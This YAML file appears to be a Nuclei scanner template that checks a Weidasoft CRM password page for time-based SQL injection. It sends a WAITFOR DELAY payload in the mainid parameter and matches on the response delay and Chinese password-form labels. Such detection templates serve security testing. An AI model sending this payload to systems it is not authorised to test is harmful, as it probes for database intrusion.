id: weidasoft-accountpassword-sqli
info:
  name: Weidasoft CRM AccountPassword SQL Injection
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
  description: |
    Detects an SQL Injection vulnerability in Weidasoft CRM system's AccountPassword functionality.
variables:
  t1: "{{rand_int(5,10)}}"
  t2: "{{to_number(t1) + 2}}"
http:
  - raw:
      - |
        GET /wap/common/admin/AccountPassword.jsp?mainid=1%27%3BWAITFOR+DELAY+%270%3A0%3A{{t1}}%27-- HTTP/1.1
        Host: {{Hostname}}
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "原始密码"
          - "新密码"
          - "确认密码"
      - type: dsl
        dsl:
          - "status_code == 200"
          - "duration > to_number(t1)"
          - "duration < to_number(t2)"
